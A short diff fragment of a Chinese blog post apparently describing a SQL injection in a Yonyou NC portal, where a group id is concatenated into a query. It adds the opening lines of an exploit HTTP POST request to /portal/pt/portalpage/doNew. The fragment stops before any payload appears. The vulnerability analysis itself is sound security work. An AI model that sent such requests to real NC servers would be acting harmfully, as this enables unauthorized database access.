@@ -130,6 +130,8 @@ groupid 即 pk\_group 直接拼接进 getPagesByCondition 语句中，其实现�
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")利用需要注意只能是post方法，且因为 `LfwRuntimeEnvironment.getLfwSessionBean()` 存在需要登录权限。
 
+编程
+
 ```
 POST /portal/pt/portalpage/doNew?pageId=login HTTP/1.0
 Host: nc65.mrxn.net
